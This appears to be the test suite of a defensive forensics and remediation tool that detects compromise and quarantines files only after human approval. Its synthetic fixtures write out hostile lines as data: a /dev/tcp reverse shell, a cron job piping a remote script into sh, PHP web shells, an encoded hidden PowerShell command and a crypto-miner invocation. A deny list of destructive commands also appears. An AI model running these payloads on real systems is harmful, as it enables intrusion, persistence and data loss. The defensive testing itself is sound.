"""Test-suite (stdlib unittest; also runs under pytest).

Malicious behaviour is simulated with synthetic artefacts and files inside a temporary
directory - the tests never modify the host system.
"""

import json
import os
import shutil
import stat
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from aletheia.core.audit import AuditLog  # noqa: E402
from aletheia.core.evidence import EvidenceStore, verify_manifest  # noqa: E402
from aletheia.core.runner import CommandRefused, SafeRunner  # noqa: E402
from aletheia.detection import ioc, rules  # noqa: E402
from aletheia.remediation import engine, planner  # noqa: E402

EICAR = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
EICAR_SHA256 = "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"


class TmpCase(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="aletheia_test_")

    def tearDown(self):
        for root, dirs, files in os.walk(self.tmp):
            for n in dirs + files:
                try:
                    os.chmod(os.path.join(root, n), 0o700)
                except OSError:
                    pass
        shutil.rmtree(self.tmp, ignore_errors=True)


class TestAuditChain(TmpCase):
    def test_chain_detects_tampering(self):
        path = os.path.join(self.tmp, "audit.jsonl")
        log = AuditLog(path, "CASE-1")
        for i in range(5):
            log.record("step", {"i": i})
        ok, problems, n, _ = AuditLog.verify(path)
        self.assertTrue(ok, problems)
        self.assertEqual(n, 5)
        lines = open(path).read().splitlines()
        entry = json.loads(lines[2])
        entry["details"]["i"] = 999
        lines[2] = json.dumps(entry, sort_keys=True)
        open(path, "w").write("\n".join(lines) + "\n")
        ok, problems, _, _ = AuditLog.verify(path)
        self.assertFalse(ok)
        self.assertTrue(any("altered" in p for p in problems))

    def test_deleted_entry_detected(self):
        path = os.path.join(self.tmp, "audit.jsonl")
        log = AuditLog(path, "CASE-1")
        for i in range(4):
            log.record("step", {"i": i})
        lines = open(path).read().splitlines()
        del lines[1]
        open(path, "w").write("\n".join(lines) + "\n")
        self.assertFalse(AuditLog.verify(path)[0])


class TestEvidenceStore(TmpCase):
    def test_write_once_readonly_and_manifest(self):
        store = EvidenceStore(self.tmp)
        rec = store.save_json("thing", {"a": 1})
        full = os.path.join(self.tmp, rec["path"])
        self.assertFalse(os.stat(full).st_mode & stat.S_IWUSR)
        with self.assertRaises(FileExistsError):
            store.save_json("thing", {"a": 2})
        store.build_manifest()
        ok, problems, n = verify_manifest(self.tmp)
        self.assertTrue(ok, problems)
        os.chmod(full, 0o600)
        open(full, "w").write('{"a": 666}')
        ok, problems, _ = verify_manifest(self.tmp)
        self.assertFalse(ok)
        self.assertTrue(any("ALTERED" in p for p in problems))

    def test_added_file_detected(self):
        store = EvidenceStore(self.tmp)
        store.save_json("x", {})
        store.build_manifest()
        open(os.path.join(self.tmp, "evidence", "planted.txt"), "w").write("x")
        ok, problems, _ = verify_manifest(self.tmp)
        self.assertFalse(ok)
        self.assertTrue(any("UNLISTED" in p for p in problems))


class TestRunnerSafety(unittest.TestCase):
    def test_refuses_non_allowlisted(self):
        with self.assertRaises(CommandRefused):
            SafeRunner().run(["rm", "-rf", "/nonexistent"])

    def test_refuses_state_changing_args(self):
        r = SafeRunner()
        for argv in (["reg", "delete", "HKCU\\x"], ["systemctl", "stop", "ssh"], ["schtasks", "/delete", "/tn", "x"],
                     ["clamscan", "--remove", "/tmp"], ["wevtutil", "cl", "Security"], ["crontab", "-r"],
                     ["powershell", "-Command", "Remove-Item C:\\x"], ["netsh", "advfirewall", "set", "allprofiles"]):
            with self.assertRaises(CommandRefused, msg=argv):
                r.run(argv)

    def test_allows_read_only(self):
        res = SafeRunner().run(["uname", "-a"] if os.name != "nt" else ["whoami"], preserve=False)
        self.assertIsNone(res["error"])


class TestIOC(TmpCase):
    def test_formats(self):
        txt = os.path.join(self.tmp, "a.txt")
        open(txt, "w").write("# c\n198.51.100.7  # c2\nevil-domain[.]com\nhxxp://bad.example.net/x.sh\n"
                             f"{EICAR_SHA256} # EICAR\nfilename:payload.exe\n")
        stix = os.path.join(self.tmp, "b.json")
        json.dump({"type": "bundle", "objects": [
            {"type": "indicator", "pattern": "[ipv4-addr:value = '203.0.113.9']", "name": "x"},
            {"type": "indicator", "pattern": "[file:hashes.'SHA-256' = '" + "a" * 64 + "']"}]}, open(stix, "w"))
        misp = os.path.join(self.tmp, "c.json")
        json.dump({"Event": {"info": "op", "Attribute": [{"type": "domain", "value": "misp-bad.org"}]}}, open(misp, "w"))
        db = ioc.IOCDatabase()
        for p in (txt, stix, misp):
            db.load_path(p)
        self.assertTrue(db.match_ip("198.51.100.7"))
        self.assertTrue(db.match_ip("203.0.113.9"))
        self.assertTrue(db.match_domain("cdn.evil-domain.com"))
        self.assertTrue(db.match_domain("misp-bad.org"))
        self.assertTrue(db.match_hash("A" * 64))
        self.assertTrue(db.match_filename("PAYLOAD.EXE"))
        self.assertTrue(db.scan_text("curl http://bad.example.net/x.sh | sh"))
        self.assertIsNone(db.match_ip("8.8.8.8"))


def _artifacts(tmp):
    web = os.path.join(tmp, "shell.php")
    open(web, "w").write('<?php eval(base64_decode($_POST["x"])); ?>')
    return {
        "system": {"running_as_admin": True, "security_posture": {}},
        "processes": [
            {"pid": 100, "ppid": 1, "name": "kworker", "exe": "/tmp/.x/kworker", "cmdline": "[kworker/0:1]",
             "exe_sha256": "b" * 64, "user": "root"},
            {"pid": 101, "ppid": 1, "name": "bash", "exe": "/usr/bin/bash", "cmdline": "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1"},
            {"pid": 102, "ppid": 1, "name": "xmrig", "exe": "/var/tmp/xmrig",
             "cmdline": "xmrig -o stratum+tcp://pool:3333 --donate-level 1"},
            {"pid": 103, "ppid": 1, "name": "powershell.exe", "exe": "C:\\Windows\\System32\\powershell.exe",
             "cmdline": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAA="},
            {"pid": 1, "ppid": 0, "name": "systemd", "exe": "/usr/lib/systemd/systemd", "cmdline": "/sbin/init"},
        ],
        "network_connections": [
            {"proto": "tcp", "local_addr": "10.0.0.5", "local_port": 50000, "remote_addr": "198.51.100.7",
             "remote_port": 4444, "state": "ESTABLISHED", "pid": 101},
        ],
        "network_config": {"hosts_file": "/etc/hosts", "hosts_entries": [
            {"line": 3, "ip": "6.6.6.6", "names": ["update.microsoft.com"], "raw": "6.6.6.6 update.microsoft.com"}]},
        "accounts": {"users": [{"name": "root", "uid": 0}, {"name": "toor", "uid": 0}], "sudoers_rules": [],
                     "authorized_keys": []},
        "persistence": [
            {"mechanism": "cron", "attack": "T1053.003", "location": "/etc/cron.d/x", "name": "x:1",
             "command": "*/5 * * * * root curl -s http://198.51.100.7/x.sh | sh", "line": 1,
             "remediation_hint": {"type": "comment_out_line", "file": "/etc/cron.d/x", "line": 1,
                                  "content": "*/5 * * * * root curl -s http://198.51.100.7/x.sh | sh"}},
            {"mechanism": "ld.so.preload", "attack": "T1574.006", "location": "/etc/ld.so.preload",
             "name": "/lib/libhide.so", "command": "/lib/libhide.so", "line": 1, "raw": "/lib/libhide.so",
             "remediation_hint": {"type": "comment_out_line", "file": "/etc/ld.so.preload", "line": 1,
                                  "content": "/lib/libhide.so"}},
            {"mechanism": "systemd", "attack": "T1543.002", "location": "/usr/lib/systemd/system/ssh.service",
             "name": "ssh.service", "command": "/usr/sbin/sshd -D", "vendor_dir": True},
        ],
        "filesystem": [
            {"path": "/tmp/eicar.com", "type": "file", "name": "eicar.com", "sha256": EICAR_SHA256},
            {"path": web, "type": "file", "name": "shell.php", "size": 60, "sha256": "c" * 64},
            {"path": "/tmp/.cache/implant", "type": "file", "name": "implant", "kind": "ELF", "hidden": True,
             "in_temp_location": True, "sha256": "d" * 64},
            {"path": "/home/u/Downloads/invoice.pdf.exe", "type": "file", "name": "invoice.pdf.exe", "sha256": "e" * 64},
        ],
        "filesystem_scope": {"suid_sgid": [{"path": "/tmp/.rootsh/bash", "suid": True, "uid": 0, "mode": "-rwsr-xr-x"}]},
        "logs": {"auth_summary": {"failed_by_ip": {"203.0.113.50": 250}, "accepted": {"admin@203.0.113.50": 1}},
                 "auth_events": [], "history_lines": [{"file": "/root/.bash_history", "line": 9,
                                                       "command": "unset HISTFILE; wget http://x/y -O /tmp/y"}],
                 "windows_events": [{"log": "Security", "event_id": 1102, "time_utc": "2026-11-01T00:00:00Z",
                                     "record_id": "5", "data": {}}]},
    }


class TestRules(TmpCase):
    def test_detections(self):
        db = ioc.IOCDatabase()
        db.add("198.51.100.7", source="case")
        db.add(EICAR_SHA256, source="builtin", threat="EICAR test file")
        findings = rules.run_all(_artifacts(self.tmp), db)
        ids = {f["rule_id"] for f in findings}
        for expected in ("PROC-002", "PROC-003", "PROC-004", "PROC-006", "NET-001", "NET-003", "NET-004",
                         "PERS-001", "PERS-002", "ACCT-001", "AUTH-001", "EVT-001", "HIST-001", "FILE-001",
                         "FILE-002", "FILE-003", "FILE-004", "FILE-005"):
            self.assertIn(expected, ids, f"{expected} not raised")
        self.assertNotIn("ENGINE", ids, [f["title"] for f in findings if f["rule_id"] == "ENGINE"])
        # vendor systemd unit must NOT be flagged
        self.assertFalse(any("ssh.service" in f["title"] for f in findings))
        # every finding carries ATT&CK + evidence + sorted severity
        sev = [rules.SEV_ORDER[f["severity"]] for f in findings]
        self.assertEqual(sev, sorted(sev, reverse=True))
        for f in findings:
            self.assertTrue(f["evidence"] or f["rule_id"].startswith("SCOPE"), f["title"])

    def test_plan_is_deterministic_and_ordered(self):
        db = ioc.IOCDatabase()
        db.add("198.51.100.7")
        findings = rules.run_all(_artifacts(self.tmp), db)
        p1 = planner.build_plan("C", findings)
        p2 = planner.build_plan("C", findings)
        self.assertEqual(p1["plan_sha256"], p2["plan_sha256"])
        order = [planner.ORDER[a["type"]] for a in p1["actions"]]
        self.assertEqual(order, sorted(order))
        self.assertEqual(p1["actions"][0]["type"], "kill_process")
        types = {a["type"] for a in p1["actions"]}
        self.assertTrue({"kill_process", "block_ip", "comment_out_line", "quarantine_file", "disable_account"} <= types)


class TestRemediationGate(TmpCase):
    def _sealed_case(self, actions):
        case = os.path.join(self.tmp, "case")
        store = EvidenceStore(case)
        audit = AuditLog(os.path.join(store.logs_dir, "audit.jsonl"), "CASE-9")
        audit.record("case_opened", {})
        plan = {"case_id": "CASE-9", "created_utc": "x", "min_severity": "medium", "actions": actions, "manual": [],
                "policy": "p"}
        plan["plan_sha256"] = planner.plan_digest(plan)
        store.save_text("remediation_plan", json.dumps(plan), subdir="report", ext=".json")
        store.build_manifest()
        store.lock_all()
        return case

    def _io(self, answers):
        it = iter(answers)
        out = []
        return {"input": lambda _p="": next(it), "print": out.append}, out

    def _victims(self):
        bad = os.path.join(self.tmp, "victim", "evil.bin")
        os.makedirs(os.path.dirname(bad))
        open(bad, "wb").write(EICAR)
        cron = os.path.join(self.tmp, "victim", "crontab")
        open(cron, "w").write("# header\n*/5 * * * * curl http://x | sh\n0 1 * * * /usr/bin/backup\n")
        actions = [
            {"id": "A001", "type": "comment_out_line", "target": f"{cron}:2", "findings": ["F-0001"],
             "severity": "high", "reversible": True, "risk": "", "warning": "",
             "params": {"file": cron, "line": 2, "content": "*/5 * * * * curl http://x | sh"}},
            {"id": "A002", "type": "quarantine_file", "target": bad, "findings": ["F-0002"], "severity": "critical",
             "reversible": True, "risk": "", "warning": "", "params": {"path": bad, "sha256": EICAR_SHA256}},
        ]
        return bad, cron, actions

    def test_refuses_without_tty(self):
        bad, cron, actions = self._victims()
        case = self._sealed_case(actions)
        rc = engine.remediate(case)  # stdin is not a TTY under the test runner
        self.assertEqual(rc, 4)
        self.assertTrue(os.path.exists(bad))

    def test_wrong_phrase_changes_nothing(self):
        bad, cron, actions = self._victims()
        case = self._sealed_case(actions)
        io, _ = self._io(["Jane Examiner", "APPROVE WRONG-CASE"])
        self.assertEqual(engine.remediate(case, _io=io), 1)
        self.assertTrue(os.path.exists(bad))
        self.assertIn("curl", open(cron).read().splitlines()[1])
        self.assertFalse([d for d in os.listdir(case) if d.startswith("remediation_")])

    def test_dry_run_changes_nothing(self):
        bad, cron, actions = self._victims()
        case = self._sealed_case(actions)
        io, out = self._io([])
        self.assertEqual(engine.remediate(case, dry_run=True, _io=io), 0)
        self.assertTrue(os.path.exists(bad))
        self.assertTrue(any("DRY RUN" in l for l in out))

    def test_tampered_case_refused(self):
        bad, cron, actions = self._victims()
        case = self._sealed_case(actions)
        p = os.path.join(case, "report", "remediation_plan.json")
        os.chmod(p, 0o600)
        open(p, "a").write(" ")
        io, out = self._io(["x"])
        self.assertEqual(engine.remediate(case, _io=io), 3)
        self.assertTrue(os.path.exists(bad))

    def test_approved_select_and_execute(self):
        bad, cron, actions = self._victims()
        case = self._sealed_case(actions)
        io, out = self._io(["Jane Examiner", "APPROVE CASE-9", "s", "y", "y", "EXECUTE"])
        self.assertEqual(engine.remediate(case, _io=io), 0, "\n".join(out))
        self.assertFalse(os.path.exists(bad))
        lines = open(cron).read().splitlines()
        self.assertTrue(lines[1].startswith("# [ALETHEIA-DISABLED"))
        self.assertEqual(lines[2], "0 1 * * * /usr/bin/backup")
        ws = [d for d in os.listdir(case) if d.startswith("remediation_")][0]
        ws = os.path.join(case, ws)
        self.assertTrue(verify_manifest(ws)[0])
        self.assertTrue(AuditLog.verify(os.path.join(ws, "remediation_audit.jsonl"))[0])
        # the original analysis case is still intact
        self.assertTrue(engine.verify_case(case)["ok"])
        # quarantine is restorable byte-for-byte
        from aletheia.remediation.actions import restore_quarantine

        q = [f for f in os.listdir(os.path.join(ws, "quarantine")) if f.endswith(".quarantine")][0]
        restored = restore_quarantine(os.path.join(ws, "quarantine", q))
        self.assertEqual(open(restored, "rb").read(), EICAR)

    def test_changed_target_is_skipped(self):
        bad, cron, actions = self._victims()
        open(bad, "ab").write(b"changed")  # file differs from what analysis hashed
        case = self._sealed_case(actions[1:])
        io, out = self._io(["Jane", "APPROVE CASE-9", "a", "EXECUTE"])
        engine.remediate(case, _io=io)
        self.assertTrue(os.path.exists(bad))
        self.assertTrue(any("SKIPPED" in l for l in out))


class TestEndToEnd(TmpCase):
    def test_scan_sealed_and_verifiable(self):
        from aletheia.core.context import CaseInfo
        from aletheia.scan import run_scan

        target = os.path.join(self.tmp, "target")
        os.makedirs(target)
        open(os.path.join(target, "eicar.com"), "wb").write(EICAR)
        open(os.path.join(target, "shell.php"), "w").write('<?php system($_GET["c"]); ?>')
        res = run_scan(CaseInfo(case_id="E2E-1", examiner="CI"), os.path.join(self.tmp, "out"), profile="quick",
                       paths=[target], log=lambda *a, **k: None)
        s = res["summary"]
        titles = " ".join(f["title"] for f in s["findings"])
        self.assertIn("eicar.com", titles)
        self.assertIn("shell.php", titles)
        self.assertTrue(engine.verify_case(s["case_dir"])["ok"])
        for f in ("report.html", "report.json", "findings.csv", "timeline.csv", "iocs_stix21.json",
                  "remediation_plan.json"):
            self.assertTrue(os.path.exists(os.path.join(s["case_dir"], "report", f)), f)
        # analysis must not have touched the target files
        self.assertEqual(open(os.path.join(target, "eicar.com"), "rb").read(), EICAR)


class TestMacInvestigationOffline(TmpCase):
    """Runs the macOS module against a synthetic Mac volume and proves nothing was modified."""

    def _hashes(self, root):
        import hashlib

        out = {}
        for dp, _d, fs in os.walk(root):
            for f in fs:
                p = os.path.join(dp, f)
                out[os.path.relpath(p, root)] = (hashlib.sha256(open(p, "rb").read()).hexdigest(), os.stat(p).st_mtime_ns)
        return out

    def test_offline_mac_volume(self):
        sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
        import mac_fixture
        from aletheia.core.context import CaseInfo
        from aletheia.scan import run_scan

        vol = os.path.join(self.tmp, "MacHD")
        info = mac_fixture.build(vol)
        before = self._hashes(vol)
        res = run_scan(CaseInfo(case_id="MAC-1", examiner="CI"), os.path.join(self.tmp, "out"), profile="quick",
                       log=lambda *a, **k: None,
                       options={"mac_investigation": True, "mac_root": vol, "watch": [info["watched"]], "days": 3650})
        after = self._hashes(vol)
        self.assertEqual(before, after, "evidence volume was modified (content, mtime or new -wal/-shm files)")
        case = res["summary"]["case_dir"]
        self.assertTrue(engine.verify_case(case)["ok"])
        self.assertFalse(os.path.exists(os.path.join(case, "_work")), "working copies must be removed before sealing")
        data = json.load(open(os.path.join(case, "report", "report.json")))
        qs = {q["id"]: q for q in data["investigation"]["questions"]}
        self.assertEqual(set(qs), {f"Q{i}" for i in range(1, 10)})
        t = qs["Q1"]["tables"]
        self.assertEqual(t["Mail sent/forwarded to watched addresses"]["total"], 2)
        self.assertEqual(t["Mail rules that forward/redirect"]["total"], 1)
        self.assertEqual(t["Visits to webmail forwarding/rules pages"]["total"], 1)
        self.assertEqual(qs["Q8"]["tables"]["Deleted / Trash e-mails"]["total"], 1)
        self.assertEqual(qs["Q8"]["tables"]["Forwarded e-mails"]["total"], 2)
        self.assertGreaterEqual(qs["Q2"]["tables"]["Messages involving watched keywords"]["total"], 1)
        self.assertEqual(qs["Q5"]["tables"]["Known Wi-Fi networks"]["total"], 2)
        self.assertEqual(qs["Q5"]["tables"]["IP address leases (DHCP)"]["rows"][0][2], "192.168.50.23")
        self.assertGreaterEqual(qs["Q3"]["tables"]["Downloads"]["total"], 2)
        rules_hit = {f["rule_id"] for f in data["findings"]}
        for r in ("MAC-001", "MAC-002", "MAC-005", "MAC-006"):
            self.assertIn(r, rules_hit)
        # Apple's own app with Accessibility must not be flagged
        self.assertFalse(any("com.apple.Terminal" in f["title"] for f in data["findings"]))
        # message text is NOT collected by default
        self.assertNotIn("sent you the file", json.dumps(data))
        self.assertTrue(os.path.isdir(os.path.join(case, "report", "investigation")))

    def test_runner_blocks_mac_state_changes(self):
        r = SafeRunner()
        for argv in (["log", "erase", "--all"], ["log", "collect"], ["pmset", "-a", "sleep", "0"],
                     ["profiles", "remove", "-all"], ["profiles", "-D"], ["sfltool", "resetbtm"],
                     ["systemsetup", "-setremotelogin", "off"], ["systemextensionsctl", "uninstall", "x", "y"],
                     ["launchctl", "kickstart", "-k", "system/x"], ["fdesetup", "disable"], ["csrutil", "disable"],
                     ["tmutil", "delete", "/x"]):
            with self.assertRaises(CommandRefused, msg=argv):
                r.run(argv)


if __name__ == "__main__":
    unittest.main(verbosity=2)
